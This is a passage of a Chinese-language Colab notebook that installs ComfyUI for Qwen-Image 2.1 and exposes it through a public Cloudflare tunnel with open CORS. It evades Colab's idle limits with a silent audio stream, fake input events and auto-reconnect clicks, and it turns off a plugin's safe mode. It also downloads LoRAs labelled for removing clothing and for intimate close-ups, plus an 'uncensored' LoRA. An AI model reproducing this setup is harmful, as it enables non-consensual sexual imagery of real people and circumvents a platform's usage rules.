        _s = _s.replace(_old_lc, "", 1)
        _s = _s.replace('"vae": ("VAE",),', '"vae": ("VAE",),\n                "loop_count": ("INT", {"default": 0, "min": 0, "max": 100, "step": 1}),', 1)
    _s = _s.replace("        frame_rate: int,\n        loop_count: int,", "        frame_rate: int = 24,\n        loop_count: int = 0,")
    if _s != _s_orig:
        open(_vhs_np, "w", encoding="utf-8").write(_s)

# Auto-install AI 角色三合一参考图集 (ai-pose-gallery-zh) & H3 FaceRefine / OneClickSwap custom nodes
_cn_dir = "/content/ComfyUI/custom_nodes"
if os.path.isdir(_cn_dir):
    for _rn, _ru in [
        ("ai-pose-gallery-zh", "https://github.com/anhao/ai-pose-gallery-zh.git"),
        ("ComfyUI-H3-FaceRefine", "https://github.com/Carasibana/ComfyUI-H3-FaceRefine.git"),
        ("comfyui-h3-oneclick-swap", "https://github.com/D3voz/comfyui-h3-oneclick-swap.git"),
    ]:
        _rp = os.path.join(_cn_dir, _rn)
        if not os.path.exists(_rp):
            print(f"📦 正在自动安装插件: {_rn} ...")
            subprocess.run(["git", "clone", "--depth", "1", "-q", _ru, _rp], check=False)

_pca_ext = "/content/ComfyUI/custom_nodes/ai-pose-gallery-zh/comfyui_plugin/web/extension.js"
if os.path.exists(_pca_ext):
    _pca_s = open(_pca_ext, "r", encoding="utf-8").read()
    if "this.safeMode = true;" in _pca_s:
        _pca_s = _pca_s.replace("this.safeMode = true;", "this.safeMode = false;")
        open(_pca_ext, "w", encoding="utf-8").write(_pca_s)

if _is_port_open(8188):
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:8188/api/free",
            data=b'{"unload_models": true, "free_memory": true}',
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
        print("♻️ 已为您热释放旧模型显存并无缝挂载新底模（原 ComfyUI 网页保持在线，无需重启）！")
    except Exception:
        pass
else:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

for _pw in range(3):
    try:
        urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0", "Accept-Encoding": "gzip"}), timeout=120).read()
        break
    except Exception:
        time.sleep(2)

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 挂载与启动全部完成！（网址保持固定不断连，随时可点击切换其他模型选项）")
print("="*65)
print(f"🌐 【首选直连 · Cloudflare 免403极速缓存通道】：\n👉 {cf_url}")
print("="*65)

display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#4ade80;">✅ 模型挂载与 ComfyUI 已就绪（网址固定不断连）！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#22c55e;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
  
  <div style="margin-top:10px;font-size:12px;color:#94a3b8;">🛡️ 已开启后台自动防休眠保活心跳（您在 ComfyUI 网页操作时，Colab 不会因闲置自动断连关机）</div>
</div>
<script>
  if (!window.__minimaxColabKeepAlive) {{
    window.__minimaxColabKeepAlive = setInterval(() => {{
      try {{
        const btn = document.querySelector('colab-connect-button');
        if (btn && btn.shadowRoot) {{
          const text = btn.shadowRoot.textContent || '';
          if (text.includes('Reconnect') || text.includes('重新连接')) {{
            btn.click();
          }}
        }}
        fetch(window.location.href, {{method: 'HEAD', cache: 'no-store'}}).catch(()=>{{}});
      }} catch(e) {{}}
    }}, 60000);
  }}
</script>
"""))

try:
    output.eval_js(f'window.open("{cf_url}", "_blank")')
except Exception:
    pass

# === [AGY_FOREGROUND_GUARDIAN_V2] 保持 Colab 内核 Busy 防闲置断连 + ComfyUI/隧道崩溃 3秒自动复活 ===
print("🛡️ [防断连守护已启动] 当前单元格将保持运行状态以防止 Colab 闲置回收（如需切换其他模型格，点左上角 ⏹️ 停止即可）...")
_guardian_tick = 0
try:
    while True:
        time.sleep(15)
        _guardian_tick += 1
        # 1. 检查 ComfyUI 8188 端口，若因显存/内存峰值闪退则 3 秒内原地自动重启（网址不变）
        if not _is_port_open(8188):
            print("⚠️ 检测到 ComfyUI 引擎意外退出，正在 3 秒内自动重启恢复（原 Cloudflare 网址保持不变）...")
            subprocess.Popen(
                ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
                cwd="/content/ComfyUI",
                start_new_session=True
            )
            for _ in range(90):
                if _is_port_open(8188):
                    print("✅ ComfyUI 引擎已自动复活！切回网页即可继续使用。")
                    break
                time.sleep(0.5)
        # 2. 检查 cloudflared 进程是否存活
        if subprocess.run(["pgrep", "-x", "cloudflared"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
            print("⚠️ 检测到 Cloudflare 隧道进程断开，正在自动重连...")
            cf_url = _ensure_cf_tunnel()
            print(f"✅ 隧道已重新连通：👉 {cf_url}")
        # 3. 每 45 秒通过 Colab 官方双向 RPC 通道发送一次轻量心跳，重置前端闲置计时器
        if _guardian_tick % 3 == 0:
            try:
                from google.colab import output as _colab_out
                _colab_out.eval_js("1", ignore_result=True)
            except Exception:
                pass
except KeyboardInterrupt:
    print("⏹️ 已手动停止守护循环（后台 ComfyUI 与隧道仍保持运行，可随时运行其他单元格）。")


In [ ]:
# @title 🎨 6. 千问 Qwen-Image 2.1 生图+改图一体选项（13.6G底模 + 专用双CLIP + 专用VAE + 专属LoRA与工作流）
# === [AGY_COLAB_KEEPALIVE_GUARD] ===
try:
    from IPython.display import display, Javascript
    display(Javascript('''
    (function(){
      try {
        if (!window._agyKeepAliveAudio) {
          const Ctx = window.AudioContext || window.webkitAudioContext;
          const ctx = new Ctx();
          const osc = ctx.createOscillator();
          const g = ctx.createGain();
          g.gain.value = 0.00001;
          osc.connect(g); g.connect(ctx.destination); osc.start();
          window._agyKeepAliveAudio = ctx;
        }
      } catch(e){}
      if (window._agyKeepAliveTimer) clearInterval(window._agyKeepAliveTimer);
      window._agyKeepAliveTimer = setInterval(() => {
        try {
          if (window._agyKeepAliveAudio && window._agyKeepAliveAudio.state === 'suspended') window._agyKeepAliveAudio.resume();
          const doc = window.parent ? window.parent.document : document;
          doc.dispatchEvent(new MouseEvent('mousemove', {bubbles:true, clientX:120, clientY:120}));
          doc.dispatchEvent(new KeyboardEvent('keydown', {bubbles:true, key:'Shift'}));
        } catch(e){}
      }, 45000);
    })();
    '''))
except Exception:
    pass
import os, subprocess, json, time, socket, re, urllib.request, base64, zlib
from IPython.display import display, HTML
from google.colab import output
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

# @markdown > 💡 **选择千问 Qwen-Image 2.1 底模与 CLIP 配置**：
千问21主模型选择 = "v2.1 标准满血版 (13.6G BF16 · 25步精修)" # @param ["v2.1 标准满血版 (13.6G BF16 · 25步精修)", "v2.1 Turbo 极速满血版 (13.6G BF16 · 8步出图)", "夜曲 NoctQA 动漫破限满血版 (13.6G BF16 · C站特调)"]
千问21默认CLIP = "16.3G 满血版 (qwen3vl_8b_bf16 · 细节最准推荐)" # @param ["16.3G 满血版 (qwen3vl_8b_bf16 · 细节最准推荐)", "8.7G 轻量化版 (qwen3vl_8b_int8 · 极速省显存)"]
C站_API_Token = "" # @param {type:"string"}
千问额外C站LoRA_ID = "3377365, 3388157, 3394502" # @param {type:"string"}
重置默认工作流 = False # @param {type:"boolean"}

diff_dir = "/content/ComfyUI/models/diffusion_models"
clip_dir = "/content/ComfyUI/models/text_encoders"
vae_dir = "/content/ComfyUI/models/vae"
lora_dir = "/content/lora_pool_qwen"
ckpt_dir = "/content/ComfyUI/models/checkpoints"
wf_dir = "/content/ComfyUI/user/default/workflows"
for _d in (diff_dir, clip_dir, vae_dir, lora_dir, ckpt_dir, wf_dir):
    os.makedirs(_d, exist_ok=True)

if "Turbo 极速满血版" in 千问21主模型选择:
    target_qwen_model = "【13.6G满血8步Turbo-千问2.1】qwen_image_2.1_turbo_bf16.safetensors"
    qwen_model_url = "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/diffusion_models/qwen_image_2.1_turbo_bf16.safetensors"
elif "标准满血版" in 千问21主模型选择:
    target_qwen_model = "【13.6G满血标准-千问2.1】qwen_image_2.1_bf16.safetensors"
    qwen_model_url = "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/diffusion_models/qwen_image_2.1_bf16.safetensors"
else:
    target_qwen_model = "【13.6G满血动漫破限-千问2.1夜曲】NoctQA_V1_bf16.safetensors"
    qwen_model_url = f"https://civitai.com/api/download/models/3362444?fileId=3250323&token={C站_API_Token}"

if "16.3G" in 千问21默认CLIP:
    target_qwen_clip = "【16.3G满血文本编码器-千问2.1】qwen3vl_8b_bf16.safetensors"
    target_qwen_clip_url = "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/text_encoders/qwen3vl_8b_bf16.safetensors"
    target_qwen_clip_min = 10 * 1024**3
else:
    target_qwen_clip = "【8.7G轻量化文本编码器-千问2.1】qwen3vl_8b_int8_convrot.safetensors"
    target_qwen_clip_url = "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/text_encoders/qwen3vl_8b_int8_convrot.safetensors"
    target_qwen_clip_min = 5 * 1024**3
target_qwen_vae = "【专用图像VAE-千问2.1】qwen_image_2.1_vae_bf16.safetensors"

keep_diffs = {target_qwen_model, "【13.6G满血动漫破限-千问2.1夜曲】NoctQA_V1_bf16.safetensors", "【13.6G满血标准-千问2.1】qwen_image_2.1_bf16.safetensors", "【13.6G满血8步Turbo-千问2.1】qwen_image_2.1_turbo_bf16.safetensors", "rt_detr_v4-x-hgnet_fp16.safetensors"}
print("🧹 正在卸载 H3 视频大底模与 25G 视频 CLIP，严格只保留【千问 Qwen-Image 2.1】配置（大幅释放磁盘空间）...")
for f in list(os.listdir(diff_dir)):
    p_rm = os.path.join(diff_dir, f)
    if os.path.islink(p_rm):
        os.unlink(p_rm)
    elif f.endswith(".safetensors") and f not in keep_diffs:
        print(f"  🗑️ 已卸载视频底模: {f}")
        os.remove(p_rm)
for f in list(os.listdir(clip_dir)):
    p_rm = os.path.join(clip_dir, f)
    if os.path.islink(p_rm):
        os.unlink(p_rm)
    elif f.endswith(".safetensors") and f != target_qwen_clip:
        print(f"  🗑️ 已卸载非千问 CLIP: {f}")
        os.remove(p_rm)

qwen_downloads = [
    (diff_dir, "【13.6G满血动漫破限-千问2.1夜曲】NoctQA_V1_bf16.safetensors", f"https://civitai.com/api/download/models/3362444?fileId=3250323&token={C站_API_Token}", 5 * 1024**3),
    (diff_dir, "【13.6G满血标准-千问2.1】qwen_image_2.1_bf16.safetensors", "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/diffusion_models/qwen_image_2.1_bf16.safetensors", 5 * 1024**3),
    (diff_dir, "【13.6G满血8步Turbo-千问2.1】qwen_image_2.1_turbo_bf16.safetensors", "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/diffusion_models/qwen_image_2.1_turbo_bf16.safetensors", 5 * 1024**3),
    (vae_dir, target_qwen_vae, "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/vae/qwen_image_2.1_vae_bf16.safetensors", 500 * 1024**2),
    (clip_dir, target_qwen_clip, target_qwen_clip_url, target_qwen_clip_min),
    (ckpt_dir, "sdpose_wholebody_fp16.safetensors", "https://huggingface.co/Comfy-Org/SDPose/resolve/main/checkpoints/sdpose_wholebody_fp16.safetensors", 1 * 1024**3),
    (diff_dir, "rt_detr_v4-x-hgnet_fp16.safetensors", "https://huggingface.co/Comfy-Org/SDPose/resolve/main/diffusion_models/rt_detr_v4-x-hgnet_fp16.safetensors", 100 * 1024**2),
    (lora_dir, "【千问2.1-官方8步极速加速LoRA】qwen_image_2.1_turbo_lora_bf16.safetensors", "https://huggingface.co/Comfy-Org/Qwen-Image-2.1/resolve/main/loras/qwen_image_2.1_turbo_lora_avg_rank_178_bf16.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-6步极速加速】Qwen-Image-2.1-viggle-turbo-v0.3-6step-lora-r128.safetensors", "https://huggingface.co/Viggle/Qwen-Image-2.1-viggle-turbo/resolve/main/Qwen-Image-2.1-viggle-turbo-v0.3-6step-lora-r128.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-4步极速加速】Qwen-Image-2.1-viggle-turbo-4step-lora-r64.safetensors", "https://huggingface.co/Viggle/Qwen-Image-2.1-viggle-turbo/resolve/main/Qwen-Image-2.1-viggle-turbo-4step-lora-r64.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-改图一致性保持】qwen-image-2.1-consistency.safetensors", "https://huggingface.co/ausboss/Qwen-Image-2.1-Consistency-LoRA/resolve/main/qwen-image-2.1-consistency.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-换装一致性保持】qwen-image-2.1-outfit-swap.safetensors", "https://huggingface.co/ausboss/Qwen-Image-2.1-Outfit-Swap-Consistency-LoRA/resolve/main/qwen-image-2.1-outfit-swap.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-画质修复精修】qwen-image-2.1-restore.safetensors", "https://huggingface.co/ausboss/Qwen-Image-2.1-Restore-LoRA/resolve/main/qwen-image-2.1-restore.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-亚洲人像美学】hina_QwenImage2.1_asianMix_Lora_v3.0-rank64.safetensors", "https://huggingface.co/RunningHubAI/rh-qwen21-hina-qwenimage2.1-asianmix-lora-v3.0-rank64-lora/resolve/main/Qwen21-%E4%BA%9A%E6%B4%B2hina_QwenImage2.1_asianMix_Lora_v3.0-rank64.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-亚洲人像摄影600px】Qwen_Image_2.1_600px_st3500.safetensors", "https://huggingface.co/RunningHubAI/rh-qwen-image-2.1ai-lora/resolve/main/Qwen%20Image%202.1%E5%8E%BB%E9%99%A4ai%E6%84%9F.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-万物转动漫LoRA】Nick_2anime_QwenImage2.1.safetensors", "https://huggingface.co/NicknickAI/QwenImage2.1-2anime/resolve/main/2anime-QwenImage2.1.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-万物转写实真人】Qwen2.1_Anything2RealCharacters.safetensors", "https://huggingface.co/WarmBloodAban/Qwen-Image-2.1-LoRAs/resolve/main/Qwen2.1_Anything2RealCharacters.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-动漫转写实真人】Anime2Real_Alpha.safetensors", "https://huggingface.co/RunningHubAI/rh-qwen-image-anime2real-lora/resolve/main/Qwen%20Image2.1_Anime2Real.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-多角度镜头运镜】multiple_angles_step1000.safetensors", "https://huggingface.co/akhaliq/Qwen-Image-2.1-Multiple-Angles-LoRA/resolve/main/multiple_angles_step1000.safetensors", 50 * 1024**2),
    (lora_dir, "【千问2.1-破限全能增强】chatrlabs-omni-lora-v0.1-bf16.safetensors", "https://huggingface.co/chatrlabs/Qwen-Image-2.1-Uncensored-Omni-LoRA-v0.1/resolve/main/chatrlabs-omni-lora-v0.1-bf16.safetensors", 50 * 1024**2),
]

_q_lines = []
for d_path, fn_name, url_str, min_bytes in qwen_downloads:
    full_p = os.path.join(d_path, fn_name)
    if not os.path.exists(full_p) or os.path.getsize(full_p) < min_bytes:
        _q_lines.append(f"{url_str}\n  dir={d_path}\n  out={fn_name}")
if _q_lines:
    print(f"⏳ 正在 8 通道并发高速下载 {len(_q_lines)} 个千问 2.1 组件...")
    with open("/tmp/qwen_dl.txt", "w", encoding="utf-8") as _qf:
        _qf.write("\n".join(_q_lines) + "\n")
    subprocess.run(["aria2c", "-i", "/tmp/qwen_dl.txt", "-c", "-j", "8", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=warn", "--summary-interval=0", "--user-agent=Mozilla/5.0"], check=False)
for _dp, _fn, _url, _mb in qwen_downloads:
    _fp = os.path.join(_dp, _fn)
    if not os.path.exists(_fp) or os.path.getsize(_fp) < _mb:
        subprocess.run(['curl', '-L', '--retry', '5', '--retry-delay', '2', '-o', _fp, _url], check=False)

QWEN_WF_B64 = "..."
import shutil as _qsh
os.makedirs("/content/wf_pool_h3", exist_ok=True)
os.makedirs("/content/wf_pool_qwen", exist_ok=True)
# 1. Back up H3 workflows to /content/wf_pool_h3 and remove from active wf_dir; back up user-edited Qwen workflows to /content/wf_pool_qwen
for _wf in list(os.listdir(wf_dir)):
    if _wf.endswith(".json"):
        _wfp = os.path.join(wf_dir, _wf)
        if not ("qwen" in _wf.lower() or "千问" in _wf):
            try:
                _qsh.copy2(_wfp, os.path.join("/content/wf_pool_h3", _wf))
                os.remove(_wfp)
            except Exception: pass
        elif not globals().get("重置默认工作流", False) and os.path.getsize(_wfp) > 100:
            try: _qsh.copy2(_wfp, os.path.join("/content/wf_pool_qwen", _wf))
            except Exception: pass

_qw_wfs = json.loads(zlib.decompress(base64.b64decode(QWEN_WF_B64)).decode("utf-8"))
for _fn, _w_def in _qw_wfs.items():
    _qact_p = os.path.join(wf_dir, _fn)
    _qpool_p = os.path.join("/content/wf_pool_qwen", _fn)
    if not globals().get("重置默认工作流", False) and os.path.exists(_qact_p) and os.path.getsize(_qact_p) > 100:
        try: _w = json.load(open(_qact_p, encoding="utf-8"))
        except Exception: _w = _w_def
    elif not globals().get("重置默认工作流", False) and os.path.exists(_qpool_p) and os.path.getsize(_qpool_p) > 100:
        try: _w = json.load(open(_qpool_p, encoding="utf-8"))
        except Exception: _w = _w_def
    else:
        _w = _w_def
    _m_for_wf = "【13.6G满血动漫破限-千问2.1夜曲】NoctQA_V1_bf16.safetensors" if "夜曲" in _fn else ("【13.6G满血8步Turbo-千问2.1】qwen_image_2.1_turbo_bf16.safetensors" if "极速" in _fn else target_qwen_model)
    for _n in _w.get("nodes", []):
        _nt = _n.get("type", "")
        _wv = _n.get("widgets_values")
        if _nt in ("UNETLoader", "CLIPLoader", "VAELoader") and isinstance(_wv, list):
            for _i, _v in enumerate(_wv):
                if isinstance(_v, str):
                    if ("qwen_image_2.1" in _v or "NoctQA" in _v) and "vae" not in _v:
                        _wv[_i] = _m_for_wf
                    elif "qwen3vl_8b" in _v:
                        _wv[_i] = target_qwen_clip
                    elif "qwen_image_2.1_vae" in _v:
                        _wv[_i] = target_qwen_vae
    for _sg in _w.get("definitions", {}).get("subgraphs", []):
        for _sn in _sg.get("nodes", []):
            _st = _sn.get("type", "")
            _swv = _sn.get("widgets_values")
            if _st == "UNETLoader" and isinstance(_swv, list) and len(_swv) >= 1 and "rt_detr" not in str(_swv[0]):
                _swv[0] = target_qwen_model
            elif _st == "CLIPLoader" and isinstance(_swv, list) and len(_swv) >= 1:
                _swv[0] = target_qwen_clip
            elif _st == "VAELoader" and isinstance(_swv, list) and len(_swv) >= 1:
                _swv[0] = target_qwen_vae
    for _out_p in (_qact_p, _qpool_p):
        with open(_out_p, "w", encoding="utf-8") as _f:
            json.dump(_w, _f, ensure_ascii=False, indent=2)
# Also restore any custom Qwen workflows the user saved in /content/wf_pool_qwen
for _wf in os.listdir("/content/wf_pool_qwen"):
    if _wf.endswith(".json") and ("qwen" in _wf.lower() or "千问" in _wf):
        _dst_p = os.path.join(wf_dir, _wf)
        if not os.path.exists(_dst_p):
            try: _qsh.copy2(os.path.join("/content/wf_pool_qwen", _wf), _dst_p)
            except Exception: pass
print("✅ 已部署并对齐全部千问 2.1 专属工作流（已自动隔离H3工作流 & 保护你在网页修改的参数）:", list(_qw_wfs.keys()))
civitai_qwen_loras = [
    ("3385540", "【千问2.1-唯美颜值增强V2】V2_Qwen_image_2.1_B.safetensors"),
    ("3352035", "【千问2.1-佳能相机超写实】canon_qwen21.safetensors"),
    ("3417262", "【千问2.1-亚洲人像摄影600px】Qwen_Image_2.1_600px_st3500.safetensors"),
    ("3360719", "【千问2.1-万物转动漫LoRA】Nick_2anime_QwenImage2.1.safetensors"),
    ("3377365", "【千问2.1-C站大人-女性私密特写V1】Qwen21_Female_Detail_V1.safetensors"),
    ("3388157", "【千问2.1-C站大人-女性私密特写V2】Qwen21_Female_Detail_V2.safetensors"),
    ("3394502", "【千问2.1-C站大人-去衣】Qwen21_Remove_Clothes.safetensors"),
]
from concurrent.futures import ThreadPoolExecutor as _CivExec
def _dl_qwen_civ(item):
    _vid, _lfn = item
    _lp = os.path.join(lora_dir, _lfn)
    if not os.path.exists(_lp) or os.path.getsize(_lp) < 10 * 1024**2:
        _curl = f"https://civitai.com/api/download/models/{_vid}?token={C站_API_Token}"
        subprocess.run(["curl", "-L", "-s", "--retry", "3", "--user-agent", "Mozilla/5.0", "-o", _lp, _curl], check=False)
with _CivExec(max_workers=8) as _ex:
    list(_ex.map(_dl_qwen_civ, civitai_qwen_loras))

_p2 = os.path.join(lora_dir, "【千问2.1-万物转写实真人】Qwen21_Anything2RealCharacters.safetensors")
if os.path.islink(_p2) or os.path.exists(_p2):
    try: os.remove(_p2)
    except Exception: pass

os.makedirs("/content/lora_pool_h3", exist_ok=True)
os.makedirs("/content/lora_pool_qwen", exist_ok=True)
active_loras = "/content/ComfyUI/models/loras"
os.makedirs(active_loras, exist_ok=True)
for _f in list(os.listdir(active_loras)):
    _fp = os.path.join(active_loras, _f)
    if os.path.islink(_fp):
        try: os.unlink(_fp)
        except Exception: pass
    elif os.path.isfile(_fp) and _f.endswith(".safetensors"):
        _is_qw = any(_k in _f for _k in ("千问", "Qwen", "qwen", "Anime2Real", "2anime", "canon_qwen", "chatrlabs", "multiple_angles", "viggle", "NoctQA"))
        _pool = "/content/lora_pool_qwen" if _is_qw else "/content/lora_pool_h3"
        try: os.replace(_fp, os.path.join(_pool, _f))
        except Exception: pass
for _f in sorted(os.listdir(lora_dir)):
    _fp = os.path.join(lora_dir, _f)
